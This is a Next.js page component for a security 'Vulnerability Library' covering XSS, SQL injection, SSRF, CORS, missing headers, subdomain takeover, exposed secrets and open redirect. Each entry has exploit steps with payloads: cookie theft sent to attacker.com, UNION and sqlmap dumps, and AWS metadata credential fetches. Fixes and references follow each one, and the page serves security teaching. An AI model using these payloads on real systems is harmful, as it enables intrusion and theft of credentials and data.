"use client";
import { useState } from "react";
import { BookOpen, ChevronDown, ChevronUp, ExternalLink } from "lucide-react";
import Navbar from "@/components/Navbar";

interface VulnInfo {
  id: string;
  title: string;
  emoji: string;
  severity: string;
  severityColor: string;
  what: string;
  why: string;
  exploit: string;
  fix: string;
  examples: string[];
  references: { label: string; url: string }[];
}

const VULNS: VulnInfo[] = [
  {
    id: "xss",
    title: "Cross-Site Scripting (XSS)",
    emoji: "💉",
    severity: "HIGH / CRITICAL",
    severityColor: "#EF9F27",
    what: "XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim's browser.",
    why: "XSS can steal session cookies (account takeover), redirect users to malicious sites, log keystrokes, deface pages, or perform actions on behalf of the victim.",
    exploit: `1. Find an input that reflects in the response (search box, URL param, form field)
2. Test with: <script>alert(1)</script>
3. If the alert fires, the site is vulnerable to reflected XSS
4. For stored XSS: submit the payload in a stored field (comment, profile bio)
5. When another user views the page, the payload executes in their browser
6. Advanced: steal cookies with: <script>document.location='https://attacker.com/?c='+document.cookie</script>`,
    fix: `• HTML-encode all user input before reflecting it in responses
• Use Content-Security-Policy (CSP) to restrict script sources
• Set HttpOnly flag on session cookies to prevent JS access
• Use modern frameworks (React, Vue) which auto-escape by default
• Sanitise HTML with DOMPurify if rich text is needed`,
    examples: ["Stored XSS in comment systems (MySpace Samy worm 2005)", "Reflected XSS in search results", "DOM-based XSS in single-page applications"],
    references: [
      { label: "OWASP XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      { label: "PortSwigger XSS Labs", url: "https://portswigger.net/web-security/cross-site-scripting" },
    ],
  },
  {
    id: "sqli",
    title: "SQL Injection",
    emoji: "🗄️",
    severity: "CRITICAL",
    severityColor: "#E24B4A",
    what: "SQL Injection occurs when user-supplied data is sent to a SQL interpreter without proper sanitisation, allowing attackers to manipulate database queries.",
    why: "Attackers can extract the entire database (usernames, passwords, PII), bypass authentication, modify or delete data, and in some cases achieve Remote Code Execution.",
    exploit: `1. Find a parameter that interacts with a database (id=1, search=hello)
2. Test with a single quote: id=1'  — look for SQL error messages
3. Determine number of columns: id=1 ORDER BY 1-- (increment until error)
4. Extract data: id=1 UNION SELECT username,password,null FROM users--
5. For blind SQLi: id=1 AND SLEEP(5)-- (time delay indicates vulnerability)
6. Use sqlmap for automated extraction: sqlmap -u "http://target/?id=1" --dump`,
    fix: `• Use parameterised queries / prepared statements (NEVER concatenate user input into SQL)
• Use ORMs that handle escaping automatically
• Apply principle of least privilege to database accounts
• Implement a WAF to catch common SQLi patterns
• Regularly audit and test all database interaction points`,
    examples: ["LinkedIn 2012 breach (password hashes via SQLi)", "Heartland Payment Systems 2008", "Sony Pictures 2011"],
    references: [
      { label: "OWASP SQL Injection Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
      { label: "PortSwigger SQLi Labs", url: "https://portswigger.net/web-security/sql-injection" },
    ],
  },
  {
    id: "ssrf",
    title: "Server-Side Request Forgery (SSRF)",
    emoji: "🌐",
    severity: "CRITICAL",
    severityColor: "#E24B4A",
    what: "SSRF occurs when an attacker can make the server issue HTTP requests to arbitrary destinations — including internal services not accessible from the internet.",
    why: "In cloud environments, SSRF can access the metadata endpoint (169.254.169.254) to steal IAM credentials, granting full cloud account access. Can also reach internal databases, Redis, and admin panels.",
    exploit: `1. Find a parameter that accepts a URL (url=, src=, image=, fetch=)
2. Test: url=http://127.0.0.1/  — check if internal content is returned
3. Test AWS metadata: url=http://169.254.169.254/latest/meta-data/
4. Look for IAM credentials: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
5. Test internal services: url=http://192.168.1.1/  (router admin)
6. Protocol smuggling: url=gopher://localhost:6379/_INFO (Redis)`,
    fix: `• Validate and whitelist allowed URL destinations
• Block requests to private IP ranges (10.x, 192.168.x, 172.16-31.x, 127.x)
• Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
• Use an allowlist rather than denylist approach
• Disable unnecessary URL-fetching functionality`,
    examples: ["Capital One breach 2019 (AWS metadata via SSRF)", "GitLab SSRF to internal services"],
    references: [
      { label: "OWASP SSRF Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
      { label: "PortSwigger SSRF Labs", url: "https://portswigger.net/web-security/ssrf" },
    ],
  },
  {
    id: "cors",
    title: "CORS Misconfiguration",
    emoji: "🔓",
    severity: "HIGH / CRITICAL",
    severityColor: "#EF9F27",
    what: "Cross-Origin Resource Sharing (CORS) misconfigurations allow untrusted origins to read responses from authenticated API endpoints, bypassing the same-origin policy.",
    why: "An attacker can host a malicious page that makes API requests on behalf of the victim (using their cookies) and reads the response — stealing account data, tokens, or sensitive information.",
    exploit: `1. Send a request with Origin: https://attacker.com
2. If ACAO header reflects your origin AND ACAC: true, it's critical
3. PoC page on attacker.com:
   fetch('https://victim.com/api/profile', {credentials:'include'})
   .then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?d='+btoa(d)))
4. Victim visits attacker.com → their profile data is sent to attacker`,
    fix: `• Maintain an explicit server-side whitelist of trusted origins
• Never dynamically reflect the Origin header
• Never use Access-Control-Allow-Origin: * with credentials
• Validate Origin against the whitelist before setting CORS headers`,
    examples: ["Bug bounties regularly pay $500-$5000 for CORS on authenticated endpoints"],
    references: [
      { label: "PortSwigger CORS Labs", url: "https://portswigger.net/web-security/cors" },
      { label: "OWASP CORS Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html" },
    ],
  },
  {
    id: "headers",
    title: "Missing Security Headers",
    emoji: "🛡️",
    severity: "LOW / MEDIUM",
    severityColor: "#3B82F6",
    what: "HTTP security headers instruct browsers how to handle content. Missing headers expose users to clickjacking, MIME sniffing, XSS, and downgrade attacks.",
    why: "While individual header issues are low severity, they compound with other vulnerabilities. Missing CSP worsens XSS. Missing HSTS enables HTTPS downgrade. Missing X-Frame-Options enables clickjacking.",
    exploit: `Clickjacking (missing X-Frame-Options):
1. Create a page that iframes the target: <iframe src="https://victim.com/transfer">
2. Position a transparent malicious button over the iframe button
3. Victim clicks what they think is your button, actually clicking iframe

HTTPS downgrade (missing HSTS):
1. MITM attacker intercepts HTTP request before redirect
2. Strips HTTPS and proxies HTTP requests
3. Reads/modifies all traffic (sslstrip attack)`,
    fix: `• Content-Security-Policy: default-src 'self'
• Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
• X-Frame-Options: DENY
• X-Content-Type-Options: nosniff
• Referrer-Policy: strict-origin-when-cross-origin
• Permissions-Policy: camera=(), microphone=(), geolocation=()`,
    examples: ["Clickjacking on social media 'Like' buttons", "HSTS bypass enabling MITM on public WiFi"],
    references: [
      { label: "SecurityHeaders.com Scanner", url: "https://securityheaders.com" },
      { label: "OWASP Secure Headers Project", url: "https://owasp.org/www-project-secure-headers/" },
    ],
  },
  {
    id: "takeover",
    title: "Subdomain Takeover",
    emoji: "🎯",
    severity: "HIGH",
    severityColor: "#EF9F27",
    what: "Subdomain takeover occurs when a subdomain (e.g. blog.victim.com) has a CNAME record pointing to an external service whose account has been deleted or is unclaimed.",
    why: "An attacker who claims the external service gains full control over the subdomain — can serve malicious content, phish users, steal cookies set on *.victim.com, and send emails from the trusted domain.",
    exploit: `1. Enumerate subdomains using crt.sh, DNS brute-force, etc.
2. Get CNAME for each subdomain: dig blog.victim.com CNAME
3. If CNAME points to e.g. victim.github.io and GitHub shows 404 + error page
4. Register that GitHub Pages repo/user → you now control blog.victim.com
5. Can now steal cookies: document.cookie if SameSite not set
6. Can set up phishing page under trusted domain`,
    fix: `• Remove DNS records that point to decommissioned services
• Audit all CNAME records periodically
• Implement a process to clean up DNS when decommissioning services
• Use monitoring to detect subdomain takeover attempts`,
    examples: ["Multiple Fortune 500 subdomain takeovers (Hackerone disclosed)", "Hundreds of Microsoft subdomain takeovers reported"],
    references: [
      { label: "Can I Take Over XYZ (GitHub)", url: "https://github.com/EdOverflow/can-i-take-over-xyz" },
      { label: "HackerOne Subdomain Takeover Guide", url: "https://www.hackerone.com/application-security/guide-subdomain-takeovers" },
    ],
  },
  {
    id: "secrets",
    title: "Exposed Secrets & Sensitive Files",
    emoji: "🔑",
    severity: "CRITICAL / HIGH",
    severityColor: "#E24B4A",
    what: "Sensitive files (`.env`, `.git/config`, `wp-config.php`) or secrets (API keys, passwords) exposed publicly in the web root or JavaScript files.",
    why: "Exposed credentials can be used immediately — to access cloud infrastructure, payment systems, databases, or third-party services. Often leads to full system compromise.",
    exploit: `1. Directly access /.env, /.git/config, /wp-config.php
2. Search JS files for credential patterns: grep for API keys
3. Use git-dumper to clone exposed .git repos: git-dumper https://target.com/.git repo/
4. Extract DB credentials from config files → direct database access
5. Use exposed AWS keys: aws iam get-user --profile stolen`,
    fix: `• Never commit secrets to version control
• Keep .env files outside the web root
• Use .gitignore and .dockerignore to exclude sensitive files
• Configure web server to deny access to hidden files (.*) and config files
• Rotate any exposed credentials immediately
• Use secret scanning tools (git-secrets, trufflehog) in CI/CD`,
    examples: ["Uber 2016: AWS keys in GitHub → 57M user records exposed", "Toyota 2023: AWS keys exposed in public repo for 5 years"],
    references: [
      { label: "TruffleHog Secret Scanner", url: "https://github.com/trufflesecurity/trufflehog" },
      { label: "OWASP Cryptographic Failures", url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" },
    ],
  },
  {
    id: "redirect",
    title: "Open Redirect",
    emoji: "↩️",
    severity: "MEDIUM",
    severityColor: "#3B82F6",
    what: "Open redirect vulnerabilities allow attackers to redirect users from a trusted domain to an arbitrary external URL by manipulating redirect parameters.",
    why: "Used for phishing — attackers craft links like https://trusted.com/login?next=https://evil.com. Users trust the trusted.com domain and follow the link without noticing they land on evil.com.",
    exploit: `1. Find redirect parameters: /login?next=/, /auth?return=/, /out?url=
2. Test: /login?next=https://attacker.com
3. If you land on attacker.com after clicking the link, it's vulnerable
4. Create phishing email: "Click here to verify your account"
   linking to: https://victim.com/login?next=https://attacker.com/fake-login
5. Bypass filters: //attacker.com, /\\attacker.com, %2F%2Fattacker.com`,
    fix: `• Validate redirect destinations against a whitelist of trusted domains
• Use relative paths for post-login redirects instead of absolute URLs
• If external redirects are needed, show an interstitial warning page
• Reject any redirect value containing a protocol (://) or starting with //`,
    examples: ["Google open redirect bugs (common HackerOne reports)", "OAuth redirect_uri manipulation"],
    references: [
      { label: "PortSwigger Open Redirect Labs", url: "https://portswigger.net/web-security/dom-based/open-redirection" },
    ],
  },
];

export default function LearnPage() {
  const [expanded, setExpanded] = useState<string | null>(null);

  const toggle = (id: string) => setExpanded(prev => prev === id ? null : id);

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">

        <div className="text-center mb-10">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs mb-4"
               style={{ background: "rgba(127,119,221,0.12)", color: "var(--accent)", border: "1px solid rgba(127,119,221,0.3)" }}>
            <BookOpen size={11} /> Security Knowledge Base
          </div>
          <h1 className="text-3xl font-bold mb-2" style={{ color: "white" }}>
            Vulnerability <span style={{ color: "var(--accent)" }}>Library</span>
          </h1>
          <p className="text-sm" style={{ color: "var(--muted)" }}>
            Learn about each vulnerability type — what it is, why it matters, how to exploit it, and how to fix it.
          </p>
        </div>

        <div className="flex flex-col gap-3">
          {VULNS.map(vuln => (
            <div key={vuln.id} className="rounded-xl overflow-hidden"
                 style={{ background: "var(--surface)", border: "1px solid var(--border)" }}>
              <button
                className="w-full flex items-center gap-3 p-4 text-left transition-colors hover:bg-white/5"
                onClick={() => toggle(vuln.id)}>
                <span className="text-2xl">{vuln.emoji}</span>
                <div className="flex-1 min-w-0">
                  <p className="font-semibold" style={{ color: "white" }}>{vuln.title}</p>
                  <span className="text-xs font-bold" style={{ color: vuln.severityColor }}>{vuln.severity}</span>
                </div>
                {expanded === vuln.id
                  ? <ChevronUp size={16} style={{ color: "var(--muted)" }} />
                  : <ChevronDown size={16} style={{ color: "var(--muted)" }} />
                }
              </button>

              {expanded === vuln.id && (
                <div className="px-4 pb-5 border-t animate-fade-in"
                     style={{ borderColor: "var(--border)" }}>
                  <div className="grid gap-4 mt-4">

                    <Section title="What is it?" icon="🔍">
                      <p className="text-sm leading-relaxed" style={{ color: "var(--body)" }}>{vuln.what}</p>
                    </Section>

                    <Section title="Why does it matter?" icon="⚠️">
                      <p className="text-sm leading-relaxed" style={{ color: "var(--body)" }}>{vuln.why}</p>
                    </Section>

                    <Section title="How to exploit it" icon="🎯">
                      <pre className="text-xs leading-relaxed whitespace-pre-wrap p-3 rounded"
                           style={{ background: "var(--surface-2)", color: "#7ee787", border: "1px solid var(--border)" }}>
                        {vuln.exploit}
                      </pre>
                    </Section>

                    <Section title="How to fix it" icon="🛠️">
                      <pre className="text-xs leading-relaxed whitespace-pre-wrap p-3 rounded"
                           style={{ background: "rgba(29,158,117,0.08)", color: "#7ee787", border: "1px solid rgba(29,158,117,0.2)" }}>
                        {vuln.fix}
                      </pre>
                    </Section>

                    {vuln.examples.length > 0 && (
                      <Section title="Real-world examples" icon="🌍">
                        <ul className="text-sm space-y-1">
                          {vuln.examples.map((ex, i) => (
                            <li key={i} className="flex items-start gap-2" style={{ color: "var(--body)" }}>
                              <span style={{ color: "var(--accent)" }}>•</span> {ex}
                            </li>
                          ))}
                        </ul>
                      </Section>
                    )}

                    {vuln.references.length > 0 && (
                      <Section title="References" icon="📚">
                        <div className="flex flex-wrap gap-2">
                          {vuln.references.map((ref, i) => (
                            <a key={i} href={ref.url} target="_blank" rel="noreferrer"
                               className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded no-underline transition-colors hover:opacity-80"
                               style={{ background: "rgba(127,119,221,0.12)", color: "var(--accent)", border: "1px solid rgba(127,119,221,0.25)" }}>
                              {ref.label} <ExternalLink size={10} />
                            </a>
                          ))}
                        </div>
                      </Section>
                    )}
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      </main>
    </div>
  );
}

function Section({ title, icon, children }: { title: string; icon: string; children: React.ReactNode }) {
  return (
    <div>
      <div className="flex items-center gap-2 mb-2">
        <span>{icon}</span>
        <h3 className="text-sm font-semibold" style={{ color: "var(--accent)" }}>{title}</h3>
      </div>
      {children}
    </div>
  );
}
